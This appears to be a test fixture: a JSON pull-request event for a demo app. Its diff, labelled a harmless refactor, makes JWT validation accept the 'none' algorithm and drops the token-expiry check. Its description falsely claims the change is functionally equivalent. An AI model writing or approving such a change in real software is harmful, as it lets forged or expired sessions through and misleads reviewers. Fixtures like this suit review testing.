@@ -1,0 +1,18 @@
+{
+  "kind": "pull_request",
+  "action": "opened",
+  "repo": "demo-org/demo-app",
+  "number": 215,
+  "title": "Refactor session token validation",
+  "body": "Switches token validation to a single helper. Should be functionally equivalent.",
+  "author": "HuyTK",
+  "branch": "refactor/session-validation",
+  "base_branch": "main",
+  "files_changed": [
+    "src/auth/session.py",
+    "src/auth/middleware.py",
+    "tests/auth/test_session.py"
+  ],
+  "diff": "diff --git a/src/auth/session.py b/src/auth/session.py\n--- a/src/auth/session.py\n+++ b/src/auth/session.py\n@@\n-def validate_token(token):\n-    if not token:\n-        return False\n-    payload = jwt.decode(token, key=PUBLIC_KEY, algorithms=['RS256'])\n-    if payload.get('exp', 0) < time.time():\n-        return False\n-    return True\n+def validate_token(token):\n+    if not token:\n+        return False\n+    try:\n+        payload = jwt.decode(token, key=PUBLIC_KEY, algorithms=['RS256','none'])\n+    except jwt.InvalidTokenError:\n+        return False\n+    return True\n",
+  "labels": ["refactor", "auth"]
+}
